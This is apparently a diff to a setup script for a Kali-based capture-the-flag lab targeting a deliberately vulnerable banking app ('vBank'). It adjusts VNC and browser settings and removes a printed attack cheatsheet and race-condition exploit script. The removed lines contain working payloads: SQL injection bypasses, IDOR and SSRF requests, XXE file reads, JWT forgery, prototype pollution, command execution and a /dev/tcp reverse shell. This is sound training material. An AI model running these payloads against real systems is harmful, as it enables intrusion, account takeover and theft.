@@ -9,7 +9,7 @@ SAFE_USER="$(printf '%s' "$KALI_USER" | tr -cd 'a-zA-Z0-9_-' | cut -c1-32)"
 [ -z "$SAFE_USER" ] && SAFE_USER="kali"
 
 TARGET_URL="${TARGET_URL:-http://vbank-app}"
-VNC_RESOLUTION="${VNC_RESOLUTION:-1920x1080}"
+VNC_RESOLUTION="${VNC_RESOLUTION:-1600x900}"
 VNC_PORT=5901
 NOVNC_PORT=6901
 
@@ -271,6 +271,13 @@ user_pref("devtools.chrome.enabled", true);
 user_pref("devtools.debugger.remote-enabled", true);
 user_pref("extensions.pocket.enabled", false);
 user_pref("browser.urlbar.suggest.searches", false);
+user_pref("general.smoothScroll", false);
+user_pref("layers.acceleration.disabled", true);
+user_pref("gfx.webrender.software", true);
+user_pref("browser.cache.disk.enable", false);
+user_pref("browser.cache.memory.enable", true);
+user_pref("browser.sessionstore.resume_from_crash", false);
+user_pref("browser.tabs.remote.autostart", true);
 EOF
 
 cat > "$FF_DIR/profiles.ini" << 'EOF'
@@ -369,157 +376,10 @@ cat > "$HOME_DIR/Desktop/notes.txt" << EOF
 
 EOF
 
-# ── Cheatsheet ─────────────────────────────────────────────────────────────────
-cat > "$HOME_DIR/Desktop/CHEATSHEET.txt" << EOF
-════════════════════════════════════════════════════════════════════
-  Lloyds vBank CTF — Attack Cheatsheet
-  Target: ${TARGET_URL}
-════════════════════════════════════════════════════════════════════
-
-[ RECON ]
-  nmap -sV -sC -p- ${TARGET_URL#http://}
-  whatweb ${TARGET_URL}
-  nikto -h ${TARGET_URL}
-  gobuster dir -u ${TARGET_URL} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
-  ffuf -u ${TARGET_URL}/FUZZ -w /usr/share/wordlists/dirb/common.txt
-
-[ SQL INJECTION ]
-  # Customer login bypass (username field)
-  Username: ' OR '1'='1
-  Password: anything
-
-  # Automated
-  sqlmap -u "${TARGET_URL}/customer/login" --data="username=x&password=x" \
-    --level=3 --risk=2 --dbms=sqlite --dump
-
-  # Staff login bypass (password field — WAF only covers emp_id)
-  Emp ID:   sysadmin
-  Password: ' OR '1'='1
-
-[ IDOR — Ch.3: Ghost Investor ]
-  # Login, then read any account's transactions without ownership check
-  curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \\
-    -X POST ${TARGET_URL}/customer/login \\
-    --data-urlencode "username=' OR '1'='1' -- " \\
-    --data-urlencode "password=x" -L > /dev/null
-
-  # CEO account (user_id=1337) — flag is in the memo of a transaction
-  curl -s -b /tmp/cookies.txt ${TARGET_URL}/api/v1/accounts/1337/transactions
-
-[ IDOR — Ch.4: Flagged for Review ]
-  # Step 1: Find blocked account ref in CEO's AML block transaction (see above)
-  # Look for "WIRE TRANSFER — AML BLOCK" memo: acct ref TVRneU5EVXpOamN4TUE9PQ==
-
-  # Step 2: Decode (double base64 — just FYI, server takes encoded form)
-  # echo "TVRneU5EVXpOamN4TUE9PQ==" | base64 -d | base64 -d  -> 1824536710
-
-  # Step 3: Craft the blocked transfer URL directly (frontend dropdown was removed, endpoint still works)
-  curl -s -b /tmp/cookies.txt \\
-    "${TARGET_URL}/account/transfer/confirm?acct=TVRneU5EVXpOamN4TUE9PQ=="
-
-[ RACE CONDITION ]
-  python3 /opt/race.py   # see ~/race.py
-
-[ AES-ECB ]
-  # Fetch encrypted receipt
-  curl -s -b /tmp/cookies.txt ${TARGET_URL}/api/v1/receipts/TXN-SYSTEM
-
-  # Decrypt (key = vbank_security!!)
-  python3 -c "
-  from Crypto.Cipher import AES; from Crypto.Util.Padding import unpad
-  import base64, json
-  ct = base64.b64decode('PASTE_HERE')
-  pt = unpad(AES.new(b'vbank_security!!', AES.MODE_ECB).decrypt(ct), 16)
-  print(json.loads(pt)['memo'])
-  "
-
-[ RCE — MAINTENANCE CONSOLE ]
-  curl -s -b /tmp/staff_cookies.txt \\
-    -X POST ${TARGET_URL}/staff/maintenance \\
-    --data-urlencode "cmd=cat /root/flag.txt"
-
-  # Reverse shell listener
-  nc -lvnp 4444
-  # Payload: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
-
-[ JWT — alg:none ]
-  # Get token
-  curl -s -b /tmp/staff_cookies.txt -X POST ${TARGET_URL}/api/v2/auth/token
-
-  # Forge with jwt_tool
-  jwt_tool <TOKEN> -X a
-  # Then: curl ${TARGET_URL}/api/v2/corporate/vault -H "Authorization: Bearer <FORGED>"
-
-[ BLIND SQLI ]
-  sqlmap -u "${TARGET_URL}/staff/credit-status" \\
-    --data="reference=VBK-CR-2401" \\
-    --cookie="\$(grep session /tmp/staff_cookies.txt | awk '{print \$NF}')" \\
-    --dbms=sqlite --dump -T secrets
-
-[ SSRF ]
-  curl -s -b /tmp/staff_cookies.txt \\
-    -X POST ${TARGET_URL}/support/document-fetch \\
-    -d "url=http://127.0.0.1/api/internal/debug"
-
-[ XXE ]
-  curl -s -b /tmp/staff_cookies.txt \\
-    -X POST ${TARGET_URL}/staff/payroll \\
-    --data-urlencode 'xml_data=<?xml version="1.0"?>
-<!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/vbank_internal.txt">]>
-<payroll><employee><id>1</id><name>x</name><department>IT</department>
-<salary>1</salary><note>&f;</note></employee></payroll>'
-
-[ PROTOTYPE POLLUTION ]
-  curl -s -b /tmp/staff_cookies.txt \\
-    -X POST ${TARGET_URL}/staff/settings/analytics/merge \\
-    -H "Content-Type: application/json" \\
-    -d '{"__proto__": {"isAdmin": true}}'
-
-  curl -s -b /tmp/staff_cookies.txt \\
-    ${TARGET_URL}/staff/settings/admin-panel
-
-[ HTTP PROXY (intercept) ]
-  mitmproxy --listen-port 8080
-  # In Firefox: Settings > Network > Manual proxy > 127.0.0.1:8080
-
-════════════════════════════════════════════════════════════════════
-EOF
-
-# ── Race condition script ──────────────────────────────────────────────────────
-cat > "$HOME_DIR/race.py" << EOF
-#!/usr/bin/env python3
-"""Race condition exploit — vBank Express Transfer"""
-import requests, threading, time
-
-BASE = "${TARGET_URL}"
-
-s = requests.Session()
-s.post(f"{BASE}/customer/login", data={"username": "' OR '1'='1", "password": "x"})
-s.post(f"{BASE}/api/v1/account/reset")
-print("[*] Logged in, balance reset to £1000")
-
-results = []
-def transfer():
-    r = s.post(f"{BASE}/api/v1/transfer/express", data={"amount": "1000"})
-    results.append(r.json())
-
-threads = [threading.Thread(target=transfer) for _ in range(25)]
-print("[*] Firing 25 concurrent transfers...")
-for t in threads: t.start()
-for t in threads: t.join()
-
-r = s.get(f"{BASE}/api/v1/account/status")
-data = r.json()
-print(f"[*] Balance: {data.get('balance')}")
-if "flag" in data:
-    print(f"[+] FLAG: {data['flag']}")
-else:
-    print("[-] Race didn't trigger — try again")
-EOF
+# Clean up any potential cheatsheet or race scripts from user desktop / home
+rm -f "$HOME_DIR/Desktop/CHEATSHEET"* "$HOME_DIR/race.py" 2>/dev/null || true
 
 chmod 755 "$HOME_DIR/Desktop/"*.desktop 2>/dev/null || true
-chmod 644 "$HOME_DIR/Desktop/CHEATSHEET.txt"
-chmod 755 "$HOME_DIR/race.py"
 chown -R "$SAFE_USER:$SAFE_USER" "$HOME_DIR"
 
 # Trust desktop launchers so XFCE skips the "Untrusted application" dialog
@@ -641,10 +501,11 @@ x11vnc \
     -rfbport $VNC_PORT \
     -xkb \
     -clip both \
-    -noxdamage \
-    -noscr \
-    -wait 5 \
-    -defer 5 \
+    -threads \
+    -noxrecord \
+    -nap \
+    -wait 10 \
+    -defer 2 \
     -logfile /tmp/x11vnc.log \
     -bg
 
@@ -887,6 +748,8 @@ cat > "$NOVNC_DIR/index.html" << 'NOVNCEOF'
     rfb.scaleViewport = true;
     rfb.resizeSession = false;
     rfb.clipViewport  = false;
+    rfb.qualityLevel  = 6;
+    rfb.compressionLevel = 2;
 
     rfb.addEventListener('connect', () => {
       overlay.classList.add('hidden');
